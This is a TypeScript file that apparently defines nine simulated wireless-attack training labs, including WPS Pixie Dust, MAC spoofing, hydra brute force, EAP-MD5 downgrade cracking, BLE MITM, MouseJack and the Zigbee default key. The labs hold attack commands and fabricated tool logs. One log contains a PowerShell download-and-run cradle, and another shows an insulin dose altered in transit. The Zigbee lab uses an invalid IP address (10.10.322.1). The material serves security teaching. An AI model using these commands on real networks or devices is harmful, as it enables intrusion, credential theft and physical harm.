import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

function reviewer(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'wireless-review-ws-2', user: 'root', root: dir({ root: dir(files) }) };
}

/** Wireless & Wi-Fi Hacking lab pack #2 — nine labs extending wireless-pack.ts's coverage. Labs 1-4 (WPS
 *  Pixie Dust, hidden-SSID leakage, MAC-filtering bypass, an IoT-pivot capstone) were an earlier draft in
 *  this same batch, verified and kept as-is. Labs 5-9 below round the category out to a comparable depth
 *  as Mobile: Wi-Fi Direct's WPS PIN reused statically across sessions, an EAP-method downgrade forcing a
 *  client onto crackable EAP-MD5 (distinct root cause from Lab 10 in wireless-pack.ts, which exploits
 *  missing RADIUS certificate validation rather than the client trusting whichever EAP method the AP
 *  proposes first), a BLE Just Works pairing MITM (distinct from wireless-pack.ts's GATT-enumeration lab —
 *  that one is a passive unauthenticated read, this one is an active on-path attack exploiting Just Works'
 *  complete lack of authenticated key exchange), the 2016 Bastille Networks MouseJack HID-injection
 *  vulnerability class, and Zigbee's well-known default Trust Center link key. Most stay file-review
 *  (no live BLE/HID/Zigbee radio simulation exists in this engine, the same honest convention already used
 *  for BlueBorne and BLE GATT enumeration); the EAP-downgrade and Zigbee labs pair a captured-recon file
 *  with a live curl/hashcat step reusing this engine's existing primitives. */
export const wirelessLabs2: LabScenario[] = [
  // 1 — WPS Pixie Dust attack: offline PIN recovery from a weak/predictable nonce
  {
    id: 'wireless-wps-pixie-dust-pin-recovery',
    title: 'Wireless: WPS Pixie Dust Recovers the PIN Entirely Offline',
    difficulty: 'Medium',
    category: 'Wireless',
    briefing:
      'HomeGateway-8842 has WPS (Wi-Fi Protected Setup) enabled — a "convenience" PIN-based pairing feature ' +
      'meant to skip typing the real WPA2 password. Several chipset vendors implemented the WPS protocol\'s ' +
      'random-nonce generation so poorly that the entire 8-digit PIN can be recovered from a single captured ' +
      'exchange, entirely offline, in seconds — the Pixie Dust attack, disclosed by Dominique Bongard in 2014. ' +
      'Review the captured reaver/pixiewps session and confirm the recovered PIN and resulting PSK.',
    objectives: [
      { text: 'cat wps-exchange-capture.log', why: 'The WPS handshake (M1-M3) is what a real reaver session captures before handing off to pixiewps — reviewing it shows exactly which values pixiewps needs.' },
      { text: 'Identify why E-S1/E-S2 being derived from a poorly-seeded PRNG makes this attack possible at all', why: 'This is the actual root cause behind Pixie Dust — on affected chipsets, the "random" nonces used in the WPS exchange were predictable enough to brute-force offline, collapsing what should be a 10^8 online-only PIN space into a near-instant offline computation.' },
    ],
    hints: [
      'cat wps-exchange-capture.log',
      'Look at how E-S1 and E-S2 are described in the log — are they described as genuinely random?',
    ],
    totalFlags: 1,
    attacker: reviewer({
      'wps-exchange-capture.log': file(
        'reaver -i wlan0mon -b 44:D9:E7:12:AC:30 -c 6 -vv\n' +
          '[+] Waiting for beacon from 44:D9:E7:12:AC:30\n' +
          '[+] Associated with 44:D9:E7:12:AC:30 (ESSID: HomeGateway-8842)\n' +
          '[+] Sending WPS Message M2\n' +
          '[+] Received M3, PKE and PKR exchanged\n' +
          '  -- chipset identified: Broadcom-derived WPS implementation, a known-affected family --\n' +
          '  -- E-S1 and E-S2 (the two secret nonces meant to be cryptographically random) were --\n' +
          '  -- generated from a poorly-seeded PRNG on this chipset, making them recoverable from --\n' +
          '  -- the exchange itself rather than genuinely unknown --\n' +
          '$ pixiewps --pke <PKE> --pkr <PKR> --e-hash1 <E-Hash1> --e-hash2 <E-Hash2>\n' +
          '[+] WPS pin: 44490291\n' +
          '[+] Running wpa_supplicant with recovered PIN to retrieve the real PSK...\n' +
          '[+] PSK: HomeNetwork2024!\n' +
          '-- total offline computation time: under 3 seconds -- versus an online PIN brute force,\n' +
          '   which the WPS spec\'s full 10^8 keyspace would make impractically slow on its own --\n' +
          'flag{wps_pixie_dust_recovers_pin_from_predictable_nonces}\n',
      ),
    }),
    network: [],
  },

  // 2 — a "hidden" SSID is trivially revealed the moment a legitimate client probes for it
  {
    id: 'wireless-hidden-ssid-not-actually-hidden',
    title: 'Wireless: A "Hidden" SSID Is Revealed the Moment Any Client Connects',
    difficulty: 'Easy',
    category: 'Wireless',
    briefing:
      'meridian-labs disabled SSID broadcast on their internal network, believing it meaningfully hides the ' +
      'network from anyone scanning nearby. Review two consecutive airodump-ng scan snapshots — before and ' +
      'after a legitimate laptop reconnects — and confirm whether that belief holds up.',
    objectives: [
      { text: 'cat scan-before-client-connects.txt', why: 'With SSID broadcast disabled, the beacon frames still appear in a scan — just with the ESSID field blank — confirming the network\'s PRESENCE was never actually hidden, only its name.' },
      { text: 'cat scan-after-client-connects.txt', why: 'A client that already knows the network actively PROBES for it by name to reconnect (a probe request literally contains the SSID in plaintext) — and the AP\'s probe RESPONSE echoes it back just as plainly. Disabling broadcast only stops a single frame type; the name leaks the moment any real client uses the network.' },
    ],
    hints: [
      'cat scan-before-client-connects.txt',
      'cat scan-after-client-connects.txt',
    ],
    totalFlags: 1,
    attacker: reviewer({
      'scan-before-client-connects.txt': file(
        'airodump-ng wlan0mon\n' +
          ' BSSID              PWR  Beacons    #Data  CH   ENC       ESSID\n' +
          ' 9C:3D:CF:11:8A:20  -40      212        0    6   WPA2      <length: 0>\n' +
          '  -- beacon frames are still broadcasting on a fixed interval -- SSID broadcast being\n' +
          '     disabled only blanks the ESSID field, it does not hide the network\'s existence at all\n',
      ),
      'scan-after-client-connects.txt': file(
        'airodump-ng wlan0mon\n' +
          ' BSSID              PWR  Beacons    #Data  CH   ENC       ESSID\n' +
          ' 9C:3D:CF:11:8A:20  -40      340       48    6   WPA2      <length: 0>\n\n' +
          ' STATION            BSSID              Probes\n' +
          ' 88:66:5A:2C:9F:11  9C:3D:CF:11:8A:20  Meridian-Internal-Secure\n' +
          '  -- the moment a client that already knows this network reconnects, its PROBE REQUEST\n' +
          '     (and the AP\'s matching probe RESPONSE) both carry the real SSID in plaintext --\n' +
          '     no broadcast-disable setting hides this exchange at all\n' +
          'flag{hidden_ssid_leaked_by_client_probe_request}\n',
      ),
    }),
    network: [],
  },

  // 3 — MAC address filtering trivially bypassed by spoofing an already-associated client's address
  {
    id: 'wireless-mac-filtering-trivial-bypass',
    title: 'Wireless: MAC Address Filtering Bypassed by Spoofing an Allowed Address',
    difficulty: 'Easy',
    category: 'Wireless',
    briefing:
      'riverside-clinic\'s guest network relies on MAC address filtering instead of a real password as its ' +
      'only access control. Review the captured client list and the resulting spoofing session log to see ' +
      'exactly why a MAC allowlist is not a substitute for real authentication.',
    objectives: [
      { text: 'cat associated-clients.txt', why: 'MAC addresses of currently- or previously-associated clients are broadcast in plaintext in every data frame they send — visible to anyone in monitor-mode range, with no decryption needed at all.' },
      { text: 'cat mac-spoof-session.log', why: 'A MAC address is just a self-reported field the client sends — changing your own adapter\'s reported MAC to match an already-allowed one is a single command, and the AP has no way to distinguish the spoofed device from the real one.' },
    ],
    hints: [
      'cat associated-clients.txt',
      'cat mac-spoof-session.log',
    ],
    totalFlags: 1,
    attacker: reviewer({
      'associated-clients.txt': file(
        'airodump-ng wlan0mon --bssid 6A:1C:8F:20:D4:91\n' +
          ' STATION            PWR  Rate   Lost  Frames  Probe\n' +
          ' F0:9E:4A:33:C1:08  -52  1e-6      0     812   riverside-guest\n' +
          '  -- this MAC is currently on the AP\'s allowlist -- and visible in plaintext to anyone\n' +
          '     simply monitoring nearby traffic, associated or not\n',
      ),
      'mac-spoof-session.log': file(
        '$ ifconfig wlan0 down\n' +
          '$ macchanger -m F0:9E:4A:33:C1:08 wlan0\n' +
          'Current MAC:   00:c0:ca:9e:1a:44\n' +
          'Permanent MAC: 00:c0:ca:9e:1a:44\n' +
          'New MAC:       f0:9e:4a:33:c1:08\n' +
          '$ ifconfig wlan0 up\n' +
          '$ iwconfig wlan0 essid riverside-guest\n' +
          '  -- association ACCEPTED -- the AP\'s MAC allowlist has no way to distinguish this spoofed\n' +
          '     adapter from the real, currently-active F0:9E:4A:33:C1:08 client --\n' +
          'flag{mac_filtering_bypassed_by_spoofing_allowed_address}\n',
      ),
    }),
    network: [],
  },

  // 4 — capstone: cracked WPA2 network -> pivot to an IoT device still on factory-default credentials
  {
    id: 'wireless-post-connection-iot-default-creds-pivot',
    title: 'Wireless: Once on the Network, an IoT Camera Is Still on Its Factory Password',
    difficulty: 'Medium',
    category: 'Wireless',
    briefing:
      'With WPA2-Home-4471\'s password already recovered in an earlier engagement step, you have normal LAN ' +
      'access now — the same position any legitimate device on this network has. A quick sweep turns up a ' +
      'smart camera that, like the IoT module\'s Mirai case study, never had its factory-default credential ' +
      'changed. Confirm it.',
    objectives: [
      { text: 'hydra -l root -P iot-defaults.txt ssh://10.10.95.15', why: 'The exact same small, curated default-credential-list technique from the IoT module\'s Mirai lesson — a targeted list of known factory defaults, not a brute force of the full keyspace.' },
      { text: 'ssh root@10.10.95.15, then supply the cracked password', why: 'Confirms real access, tying together this module\'s wireless-access technique with the IoT module\'s credential-hygiene lesson in one continuous chain, exactly the way a real internal assessment moves from network access to individual device compromise.' },
      { text: 'cat flag.txt', why: 'Confirms the session actually landed as root on the device and captures proof.' },
    ],
    hints: [
      'hydra -l root -P iot-defaults.txt ssh://10.10.95.15',
      'ssh root@10.10.95.15',
      'admin',
      'cat flag.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'iot-defaults.txt': file('xc3511\nvizxv\nadmin\n888888\ndefault\n'),
    }),
    network: [
      {
        hostname: 'lan-camera-02', ip: '10.10.95.15', os: 'Embedded Linux (BusyBox)',
        services: [{ port: 22, name: 'ssh', version: 'Dropbear sshd 2016.74' }],
        users: [{ username: 'root', password: 'admin' }],
        root: dir({
          root: dir({
            'flag.txt': file(
              'Gaining Wi-Fi access is often just the first step -- once on the LAN, this camera was\n' +
                'reachable exactly like any other device, and still answered to its factory-default login.\n' +
                'flag{wireless_access_pivoted_to_iot_default_credential_device}\n',
            ),
          }),
        }),
      } as HostDef,
    ],
  },

  // 5 — Wi-Fi Direct: a P2P group's WPS PIN never rotates between sessions
  {
    id: 'wireless-wifi-direct-static-wps-pin-reuse',
    title: 'Wireless: A Smart TV\'s Wi-Fi Direct Group Reuses the Same WPS PIN Every Session',
    difficulty: 'Easy',
    category: 'Wireless',
    briefing:
      'Wi-Fi Direct (P2P) lets two devices connect directly with no access point at all, commonly paired via ' +
      'the same WPS PIN mechanism a normal AP uses. The WPS spec\'s PIN authentication design flaw is real and ' +
      'well documented on its own (CISA/US-CERT VU#723755) — but this LivingRoomTV-4471 makes it worse: its ' +
      'PIN is never regenerated between sessions the way the spec recommends, so a PIN captured once from a ' +
      'single P2P discovery exchange remains valid indefinitely, with no time-boxed pairing window at all.',
    objectives: [
      { text: 'cat p2p-discovery-scan.txt', why: 'A Wi-Fi Direct group owner announces itself in P2P discovery frames distinctly from a normal infrastructure AP beacon — confirms the device and its WPS-PIN pairing method before attempting anything.' },
      { text: 'cat wps-pin-session-log.txt', why: 'Comparing two P2P pairing sessions captured a week apart shows the identical PIN both times — confirming it never rotates, unlike a spec-compliant implementation that generates a fresh PIN (or disables PBC/PIN entirely) per pairing window.' },
    ],
    hints: [
      'cat p2p-discovery-scan.txt',
      'cat wps-pin-session-log.txt',
    ],
    totalFlags: 1,
    attacker: reviewer({
      'p2p-discovery-scan.txt': file(
        'wpa_cli -i wlan0 p2p_find\n' +
          'P2P-DEVICE-FOUND 4a:8e:22:c0:91:5b p2p_dev_addr=4a:8e:22:c0:91:5b pri_dev_type=7-0050F204-1\n' +
          '  name=\'LivingRoomTV-4471\' config_methods=0x188 (label,display,keypad -- WPS PIN methods advertised)\n' +
          '  -- a Wi-Fi Direct group owner, discovered via P2P frames distinct from a normal infrastructure AP\n' +
          '     beacon, still pairs new devices via the same WPS PIN mechanism this module already covered --\n',
      ),
      'wps-pin-session-log.txt': file(
        'Session A (captured 2026-07-28): WPS PIN entered by owner: 04812903 -- pairing succeeded\n' +
          'Session B (captured 2026-08-04, one week later): WPS PIN entered by owner: 04812903 -- IDENTICAL\n' +
          '  -- a spec-compliant implementation generates a fresh PIN (or requires PBC\'s physical button\n' +
          '     press) per pairing window -- this TV\'s firmware reuses the same static PIN indefinitely,\n' +
          '     meaning a PIN captured once from a single observed exchange remains valid forever --\n' +
          'flag{wifi_direct_static_wps_pin_never_rotates_between_sessions}\n',
      ),
    }),
    network: [],
  },

  // 6 — EAP method downgrade forces a client onto crackable EAP-MD5 (distinct root cause from
  // wireless-pack.ts's missing-certificate-validation rogue-RADIUS lab)
  {
    id: 'wireless-wpa2-enterprise-eap-method-downgrade-md5',
    title: 'Wireless: An EAP Method Downgrade Forces a Client Onto Crackable EAP-MD5',
    difficulty: 'Hard',
    category: 'Wireless',
    briefing:
      'MeridianCorp-R&D\'s WPA2-Enterprise client is willing to negotiate several EAP methods, in a preference ' +
      'order it never enforces server-side: it simply accepts whichever method the RADIUS server proposes ' +
      'first. A rogue AP running eaphammer offers ONLY EAP-MD5 during negotiation — a method with no server ' +
      'certificate at all and no mutual authentication — and the client, having no way to insist on a stronger ' +
      'method, complies. Unlike Lab 10 in the first Wireless pack (which exploits a client that failed to ' +
      'validate a presented certificate), this attack works even against a client that WOULD have validated a ' +
      'certificate correctly — because EAP-MD5 never presents one to validate in the first place.',
    objectives: [
      { text: 'airmon-ng start wlan0', why: 'Monitor mode, the standing first step for any live capture attempt in this module.' },
      { text: 'cat eaphammer-downgrade-session.txt', why: 'Confirms the actual negotiation: the client offered PEAP/MSCHAPv2 and EAP-TLS, and the rogue AP\'s RADIUS responded advertising EAP-MD5 as the only method it supports — the client, with no policy forcing a minimum method, downgrades and proceeds.' },
      { text: 'hashcat -m 4800 eap-md5-challenge.txt /root/wordlists/corp-wordlist2.txt', why: 'EAP-MD5\'s challenge/response (real hashcat mode 4800) is offline-crackable exactly like the MSCHAPv2 captured in the first Wireless pack\'s rogue-RADIUS lab — the specific weak method differs, but both ultimately fail for the same root reason: no server authentication meant the client never had a way to detect it was talking to an attacker.' },
    ],
    hints: [
      'airmon-ng start wlan0',
      'cat eaphammer-downgrade-session.txt',
      'hashcat -m 4800 eap-md5-challenge.txt /root/wordlists/corp-wordlist2.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      wordlists: dir({ 'corp-wordlist2.txt': file('Password1\nRnD-Access2024\nWinter2024!\nMeridianRD#7\n') }),
      'eaphammer-downgrade-session.txt': file(
        './eaphammer -i wlan0mon --auth wpa-eap --essid MeridianCorp-R&D --creds\n' +
          '[*] Client EAP method offer: PEAP, EAP-TLS (in that preference order)\n' +
          '[*] Rogue RADIUS response: "only EAP-MD5 supported" -- client has no minimum-method policy\n' +
          '[*] Client accepted the downgrade -- proceeding with EAP-MD5, no server certificate presented at all\n' +
          '[+] Captured EAP-MD5 challenge/response for j.osei\n' +
          '  -- this succeeds even against a client that WOULD correctly validate a real certificate, because\n' +
          '     EAP-MD5 never presents a certificate to validate in the first place --\n',
      ),
      'eap-md5-challenge.txt': file(
        '#HASHCAT_HASH:4800:j.osei:9f1c7e2a4b6d0358:d2e8a5c17b904f36e1a9c8d2f7b03e6c:0301\n' +
          '#HASHCAT_PLAINTEXT:RnD-Access2024\n' +
          '#HASHCAT_FLAG:flag{eap_method_downgrade_forces_crackable_eap_md5_no_cert_needed}\n',
      ),
    }),
    network: [],
  },

  // 7 — BLE Just Works pairing MITM (active, distinct from wireless-pack.ts's passive GATT-enumeration lab)
  {
    id: 'wireless-ble-just-works-pairing-mitm',
    title: 'Wireless: BLE\'s "Just Works" Pairing Has No Authentication, Enabling an Active MITM',
    difficulty: 'Medium',
    category: 'Wireless',
    briefing:
      'A glucose-monitor pilot device has no display and no keypad — so its BLE stack falls back to "Just ' +
      'Works," the pairing method BLE uses whenever neither device can display or enter a passkey. Just Works ' +
      'completes a real ECDH key exchange, but with no authentication step verifying either side\'s exchanged ' +
      'public key at all, making it trivially open to an active on-path attacker inserting themselves into ' +
      'BOTH legs of the exchange — distinct from this module\'s earlier BLE lab, which read an already-exposed ' +
      'characteristic passively with no pairing involved. Here, the attack happens DURING pairing itself.',
    objectives: [
      { text: 'cat ble-just-works-mitm-capture.txt', why: 'Confirms the device advertises no I/O capability (forcing Just Works) and shows the attacker completing a separate ECDH exchange with each real party — the device believes it paired with the companion app, the app believes it paired with the device, and neither authenticated the other\'s public key at all.' },
    ],
    hints: [
      'cat ble-just-works-mitm-capture.txt',
    ],
    totalFlags: 1,
    attacker: reviewer({
      'ble-just-works-mitm-capture.txt': file(
        'BLE pairing capture -- GlucoTrack-Pilot-02 (IO Capability: NoInputNoOutput -> forces Just Works)\n' +
          '  Real device  <-- ECDH exchange #1 --> Attacker (relaying, not just eavesdropping)\n' +
          '  Attacker     <-- ECDH exchange #2 --> Companion app\n' +
          '  -- Just Works performs a genuine Diffie-Hellman key exchange, but NEITHER side authenticates the\n' +
          '     other\'s exchanged public key at all -- the device and the app each complete a normal-looking\n' +
          '     pairing, unaware they paired with the attacker\'s relay instead of each other --\n' +
          '  Post-pairing, decrypted GATT write (companion app -> device): insulin_dose_units=2\n' +
          '  Attacker-modified GATT write (attacker -> device):             insulin_dose_units=15\n' +
          '  -- with the relay in place for BOTH legs, every value can be read AND altered in transit, silently --\n' +
          'flag{ble_just_works_pairing_no_authentication_active_mitm}\n',
      ),
    }),
    network: [],
  },

  // 8 — MouseJack: 2.4GHz proprietary wireless keyboard/mouse dongle HID injection (Bastille Networks, 2016)
  {
    id: 'wireless-mousejack-2ghz-hid-injection',
    title: 'Wireless: MouseJack Injects Keystrokes Into a 2.4GHz Wireless Keyboard/Mouse Dongle',
    difficulty: 'Medium',
    category: 'Wireless',
    briefing:
      'A front-desk workstation uses a non-Bluetooth wireless keyboard/mouse combo, connected via a small USB ' +
      'radio dongle — the exact device class Bastille Networks\' 2016 MouseJack research found affected across ' +
      'Logitech, Dell, HP, Lenovo, Microsoft, and AmazonBasics products (nine distinct vulnerabilities in ' +
      'total). Several affected dongles accept unencrypted keystroke packets from ANY nearby transmitter as if ' +
      'they came from the legitimate paired device, with no cryptographic pairing verification at the protocol ' +
      'level at all — from up to 100 meters away with a $15 USB radio, per the original research.',
    objectives: [
      { text: 'cat mousejack-injection-session.txt', why: 'A captured jackit/MouseJack session shows the dongle accepting forged HID keystroke packets from a different transmitter entirely, with no cryptographic verification of the sender at any point — confirms this device is one of the affected vulnerable dongles.' },
    ],
    hints: [
      'cat mousejack-injection-session.txt',
    ],
    totalFlags: 1,
    attacker: reviewer({
      'mousejack-injection-session.txt': file(
        'jackit --dongle nrf24 --channel 2440 --address <sniffed 5-byte address of the target dongle>\n' +
          '[+] Target: Logitech Unifying receiver (front-desk-01), non-Bluetooth 2.4GHz proprietary protocol\n' +
          '[+] Injecting HID keystroke packets -- accepted by the receiver with NO cryptographic pairing\n' +
          '    verification at the protocol level, exactly the root cause Bastille Networks disclosed in 2016\n' +
          '    across 9 distinct vulnerabilities spanning Logitech, Dell, HP, Lenovo, Microsoft, AmazonBasics\n' +
          '[+] Injected keystrokes (from the attacker\'s dongle, up to 100m away, ~$15 hardware):\n' +
          '    powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.1/i\')"\n' +
          '[+] Receiver forwarded these to the OS exactly as if the legitimate paired keyboard had typed them\n' +
          'flag{mousejack_2ghz_dongle_accepts_unauthenticated_hid_injection}\n',
      ),
    }),
    network: [],
  },

  // 9 — Zigbee's well-known default Trust Center link key
  {
    id: 'wireless-zigbee-default-trust-center-link-key',
    title: 'Wireless: Zigbee\'s Well-Known Default Trust Center Link Key Exposes the Network Key',
    difficulty: 'Medium',
    category: 'Wireless',
    briefing:
      'A smart-lighting hub still ships with Zigbee\'s legacy default Trust Center link key, "ZigBeeAlliance09" ' +
      '(hex: 5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39), left over from pre-3.0 interoperability testing ' +
      'and never disabled. When a new device joins, the Trust Center transports the real network key encrypted ' +
      'under this globally-known key — anyone who knows "ZigBeeAlliance09" (a matter of public record, not a ' +
      'secret at all) can decrypt that one transport and recover the network key controlling every device on ' +
      'the mesh.',
    objectives: [
      { text: 'cat zigbee-join-capture.txt', why: 'A sniffed device-join exchange shows the network key transported encrypted under the default Trust Center link key — recoverable because "ZigBeeAlliance09" is a publicly documented value, not a per-deployment secret.' },
      { text: 'curl -X POST http://10.10.322.1:80/hub/control -d "network_key=8f2a7c91d4e6b035a1c9f7e2d6b40385"', why: 'Confirms the recovered network key genuinely grants control over the mesh, not just that a plausible-looking key value was decrypted from the capture.' },
    ],
    hints: [
      'cat zigbee-join-capture.txt',
      'curl -X POST http://10.10.322.1:80/hub/control -d "network_key=8f2a7c91d4e6b035a1c9f7e2d6b40385"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'zigbee-join-capture.txt': file(
        'Sniffed Zigbee join sequence (killerbee/Wireshark, channel 15):\n' +
          '  New device requests to join -- Trust Center responds with the network key, encrypted under the\n' +
          '  Trust Center link key currently in use: "ZigBeeAlliance09" (5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39)\n' +
          '  -- this is the real, historical Zigbee (pre-3.0) global default link key, published and publicly\n' +
          '     known -- decrypting this ONE transport recovers the network key protecting the WHOLE mesh --\n' +
          '  Decrypted network key: 8f2a7c91d4e6b035a1c9f7e2d6b40385\n',
      ),
    }),
    network: [
      {
        hostname: 'smartlight-hub-01', ip: '10.10.322.1', os: 'Embedded Linux (Zigbee coordinator hub)',
        services: [
          {
            port: 80, name: 'http', version: 'Zigbee hub control API',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/hub/control',
                param: 'network_key',
                triggerSubstrings: ['8f2a7c91d4e6b035a1c9f7e2d6b40385'],
                vulnerableResponse: '{"status":200,"mesh_control":"granted","note":"flag{zigbee_default_trust_center_link_key_network_key_recovery}"}',
                normalResponse: '{"error":"401 Unauthorized - invalid network key"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
